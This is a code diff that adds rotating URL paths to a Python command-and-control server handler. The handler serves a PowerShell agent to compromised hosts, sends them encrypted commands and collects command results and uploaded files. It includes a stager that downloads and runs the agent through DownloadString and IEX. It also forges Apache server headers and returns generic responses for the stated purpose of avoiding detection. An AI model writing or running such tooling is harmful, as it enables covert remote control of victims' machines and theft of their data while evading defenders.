@@ -1,15 +1,19 @@
+# Modified C2RequestHandler class with path rotation support
+
 import http.server
 import json
 import base64
 import os
 import time
+from datetime import datetime
 from core.utils.client_identity import extract_system_info
+from core.utils.path_rotation import PathRotationManager
 
 class C2RequestHandler(http.server.SimpleHTTPRequestHandler):
     """
     Custom HTTP request handler for C2 communications
     Handles client check-ins, commands, and file transfers with encryption
-    Supports customizable URL paths to evade detection
+    Supports dynamic URL paths that rotate periodically
     """
     
     def __init__(self, request, client_address, server, client_manager, logger, crypto_manager, campaign_name, url_paths=None):
@@ -19,7 +23,7 @@ class C2RequestHandler(http.server.SimpleHTTPRequestHandler):
         self.campaign_name = campaign_name
         
         # Set default URL paths
-        self.url_paths = {
+        self.default_paths = {
             "beacon_path": "/beacon",
             "agent_path": "/raw_agent",
             "stager_path": "/b64_stager",
@@ -28,31 +32,104 @@ class C2RequestHandler(http.server.SimpleHTTPRequestHandler):
         }
         
         # Update with custom paths if provided
+        initial_paths = self.default_paths.copy()
         if url_paths:
-            self.url_paths.update(url_paths)
+            initial_paths.update(url_paths)
             
         # Make sure all paths start with '/'
-        for key, path in self.url_paths.items():
+        for key, path in initial_paths.items():
             if not path.startswith('/'):
-                self.url_paths[key] = '/' + path
+                initial_paths[key] = '/' + path
+        
+        # Initialize path rotation if server has it
+        self.path_manager = None
+        if hasattr(server, 'path_manager'):
+            self.path_manager = server.path_manager
+        else:
+            # Create path rotation manager if not already on server
+            campaign_folder = f"{campaign_name}_campaign"
+            rotation_interval = getattr(server, 'path_rotation_interval', 3600)  # Default 1 hour
+            self.path_manager = PathRotationManager(
+                campaign_folder, 
+                logger, 
+                initial_paths=initial_paths,
+                rotation_interval=rotation_interval
+            )
+            # Load existing state if available
+            self.path_manager.load_state()
+            # Attach to server for other handlers to use
+            server.path_manager = self.path_manager
+        
+        # Check if rotation is needed
+        self.path_manager.check_rotation()
+        
+        # Get current paths from rotation manager
+        self.url_paths = self.path_manager.get_current_paths()
+        
+        # Cache path mapping for quick lookups
+        self.path_mapping = {}
+        self._update_path_mapping()
                 
         super().__init__(request, client_address, server)
+
+    def _update_path_mapping(self):
+        """Update the path mapping for quick lookups of which endpoint a path maps to"""
+        self.path_mapping = {}
+        
+        # Add current paths to mapping
+        for key, path in self.url_paths.items():
+            self.path_mapping[path] = key
+        
+        # Also add previous rotation's paths for graceful transition
+        if self.path_manager.rotation_counter > 0:
+            previous_paths = self.path_manager.get_path_by_rotation_id(self.path_manager.rotation_counter - 1)
+            if previous_paths:
+                for key, path in previous_paths.items():
+                    if path not in self.path_mapping:  # Don't overwrite current paths
+                        self.path_mapping[path] = f"previous_{key}"
 
     def log_message(self, format, *args):
         self.logger(f"{self.client_address[0]} - - [{self.log_date_time_string()}] {format % args}")
 
     def do_GET(self):
+        # Check if rotation is needed before handling request
+        if self.path_manager.check_rotation():
+            self.url_paths = self.path_manager.get_current_paths()
+            self._update_path_mapping()
+            self.logger(f"Paths rotated during request handling: {self.url_paths}")
+
         # Log the request details
         self.log_message(f"Received GET request for {self.path}")
 
-        # Route requests to appropriate handlers based on custom paths
-        if self.path == self.url_paths["agent_path"]:
+        # Look up the path in our mapping
+        path_type = self.path_mapping.get(self.path)
+        
+        # Handle request based on path type
+        if path_type == "agent_path" or path_type == "previous_agent_path":
             self.send_agent_response()
-        elif self.path == self.url_paths["stager_path"]:
+        elif path_type == "stager_path" or path_type == "previous_stager_path":
             self.send_b64_stager_response()
-        elif self.path == self.url_paths["beacon_path"]:
+        elif path_type == "beacon_path" or path_type == "previous_beacon_path":
             self.handle_beacon()
         else:
+            # Check if this is a dynamically generated path from an older rotation
+            for previous_rotation in range(max(0, self.path_manager.rotation_counter - 5), self.path_manager.rotation_counter):
+                previous_paths = self.path_manager.get_path_by_rotation_id(previous_rotation)
+                if previous_paths:
+                    for key, path in previous_paths.items():
+                        if path == self.path:
+                            # It's an old path, handle it accordingly
+                            if key == "beacon_path":
+                                self.logger(f"Request to old beacon path from rotation {previous_rotation}")
+                                self.handle_beacon(include_rotation_info=True)
+                                return
+                            elif key == "agent_path":
+                                self.send_agent_response()
+                                return
+                            elif key == "stager_path":
+                                self.send_b64_stager_response()
+                                return
+            
             # Default response for unmatched paths - provide a generic 200 response
             # This helps make the server look like a legitimate web server
             self.send_response(200)
@@ -82,7 +159,7 @@ class C2RequestHandler(http.server.SimpleHTTPRequestHandler):
             """
             self.wfile.write(message.encode("utf-8"))
     
-    def handle_beacon(self):
+    def handle_beacon(self, include_rotation_info=False):
         """Process check-in requests from clients"""
         ip = self.client_address[0]
         self.logger(f"Beacon received from {ip}")
@@ -92,6 +169,17 @@ class C2RequestHandler(http.server.SimpleHTTPRequestHandler):
         
         # Extract possible client identifier from headers
         client_identifier = self.headers.get('X-Client-ID')
+        
+        # Extract rotation info from headers (if client is using path rotation)
+        client_rotation_id = self.headers.get('X-Rotation-ID')
+        if client_rotation_id:
+            try:
+                client_rotation_id = int(client_rotation_id)
+                if client_rotation_id < self.path_manager.rotation_counter:
+                    self.logger(f"Client using outdated rotation ID {client_rotation_id}, current is {self.path_manager.rotation_counter}")
+                    include_rotation_info = True
+            except ValueError:
+                pass
         
         if system_info_encrypted:
             try:
@@ -153,6 +241,21 @@ class C2RequestHandler(http.server.SimpleHTTPRequestHandler):
         for command in commands:
             self.client_manager.log_event(client_id, "Command send", f"Type: {command['command_type']}, Args: {command['args']}")
         
+        # Add path rotation information if needed
+        if include_rotation_info:
+            rotation_info = self.path_manager.get_rotation_info()
+            rotation_command = {
+                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+                "command_type": "path_rotation",
+                "args": {
+                    "rotation_id": rotation_info["current_rotation_id"],
+                    "next_rotation_time": rotation_info["next_rotation_time"],
+                    "paths": rotation_info["current_paths"]
+                }
+            }
+            commands.append(rotation_command)
+            self.logger(f"Sending path rotation info to client {client_id}: Rotation {rotation_info['current_rotation_id']}")
+        
         # Encrypt commands json before sending
         commands_json = json.dumps(commands)
         encrypted_commands = self.crypto_manager.encrypt(commands_json)
@@ -160,6 +263,9 @@ class C2RequestHandler(http.server.SimpleHTTPRequestHandler):
         # Send encrypted data
         self.send_response(200)
         self.send_header("Content-type", "application/json")
+        # Include current rotation ID in header to keep client in sync
+        self.send_header("X-Rotation-ID", str(self.path_manager.rotation_counter))
+        self.send_header("X-Next-Rotation", str(self.path_manager.get_next_rotation_time()))
         self.end_headers()
         self.wfile.write(encrypted_commands.encode("utf-8"))
         self.client_manager.clear_pending_commands(client_id)
@@ -178,20 +284,27 @@ class C2RequestHandler(http.server.SimpleHTTPRequestHandler):
         return campaign_dirs[0][:-9]  # Remove "_campaign" suffix
     
     def send_agent_response(self):
-        """Send the PowerShell agent code"""
+        """Send the PowerShell agent code with path rotation support"""
         from core.utils.agent_generator import generate_agent_code
         
         # Get the key as base64
         key_base64 = self.crypto_manager.get_key_base64()
         server_address = f"{self.server.server_address[0]}:{self.server.server_address[1]}"
         
-        # Generate the agent code with custom URL paths
+        # Get current paths
+        current_paths = self.path_manager.get_current_paths()
+        
+        # Get rotation information
+        rotation_info = self.path_manager.get_rotation_info()
+        
+        # Generate the agent code with custom URL paths and rotation info
         agent_code = generate_agent_code(
             key_base64, 
             server_address, 
-            beacon_path=self.url_paths["beacon_path"],
-            cmd_result_path=self.url_paths["cmd_result_path"],
-            file_upload_path=self.url_paths["file_upload_path"]
+            beacon_path=current_paths["beacon_path"],
+            cmd_result_path=current_paths["cmd_result_path"],
+            file_upload_path=current_paths["file_upload_path"],
+            rotation_info=rotation_info  # Pass rotation info to the agent generator
         )
 
         self.send_response(200)
@@ -199,13 +312,16 @@ class C2RequestHandler(http.server.SimpleHTTPRequestHandler):
         # Add some legitimate-looking headers to blend in with normal web traffic
         self.send_header("Cache-Control", "max-age=3600, must-revalidate")
         self.send_header("Server", "Apache/2.4.41 (Ubuntu)")
+        self.send_header("X-Rotation-ID", str(self.path_manager.rotation_counter))
         self.end_headers()
         self.wfile.write(agent_code.encode("utf-8"))
 
     def send_b64_stager_response(self):
         """Send a Base64 encoded stager that will download and execute the agent"""
-        # Use the custom agent path
-        agent_path = self.url_paths["agent_path"]
+        # Use the current agent path
+        current_paths = self.path_manager.get_current_paths()
+        agent_path = current_paths["agent_path"]
+        
         stager_code = f"$V=new-object net.webclient;$S=$V.DownloadString('http://{self.server.server_address[0]}:{self.server.server_address[1]}{agent_path}');IEX($S)"
         
         self.send_response(200)
@@ -218,14 +334,36 @@ class C2RequestHandler(http.server.SimpleHTTPRequestHandler):
 
     def do_POST(self):
         """Handle POST requests for command results and file uploads"""
+        # Check if rotation is needed before handling request
+        if self.path_manager.check_rotation():
+            self.url_paths = self.path_manager.get_current_paths()
+            self._update_path_mapping()
+        
         # Log the request details
         self.log_message(f"Received POST request for {self.path}")
 
-        if self.path == self.url_paths["cmd_result_path"]:
+        # Look up the path in our mapping
+        path_type = self.path_mapping.get(self.path)
+        
+        if path_type == "cmd_result_path" or path_type == "previous_cmd_result_path":
             self.handle_command_result()
-        elif self.path == self.url_paths["file_upload_path"]:
+        elif path_type == "file_upload_path" or path_type == "previous_file_upload_path":
             self.handle_file_upload()
         else:
+            # Check if this is a dynamically generated path from an older rotation
+            for previous_rotation in range(max(0, self.path_manager.rotation_counter - 5), self.path_manager.rotation_counter):
+                previous_paths = self.path_manager.get_path_by_rotation_id(previous_rotation)
+                if previous_paths:
+                    for key, path in previous_paths.items():
+                        if path == self.path:
+                            # It's an old path, handle it accordingly
+                            if key == "cmd_result_path":
+                                self.handle_command_result()
+                                return
+                            elif key == "file_upload_path":
+                                self.handle_file_upload()
+                                return
+            
             # Return a generic 404 or 200 response to avoid detection
             self.send_response(200)
             self.send_header("Content-type", "text/plain")
@@ -301,6 +439,9 @@ class C2RequestHandler(http.server.SimpleHTTPRequestHandler):
             
             self.send_response(200)
             self.send_header("Content-type", "text/plain")
+            # Include current rotation ID in header to keep client in sync
+            self.send_header("X-Rotation-ID", str(self.path_manager.rotation_counter))
+            self.send_header("X-Next-Rotation", str(self.path_manager.get_next_rotation_time()))
             self.end_headers()
             self.wfile.write(b"OK")  # Simple response to look more generic
         except Exception as e:
@@ -391,6 +532,9 @@ class C2RequestHandler(http.server.SimpleHTTPRequestHandler):
             
             self.send_response(200)
             self.send_header("Content-type", "text/plain")
+            # Include current rotation ID in header to keep client in sync
+            self.send_header("X-Rotation-ID", str(self.path_manager.rotation_counter))
+            self.send_header("X-Next-Rotation", str(self.path_manager.get_next_rotation_time()))
             self.end_headers()
             self.wfile.write(b"OK")  # Simple response to look more generic
             
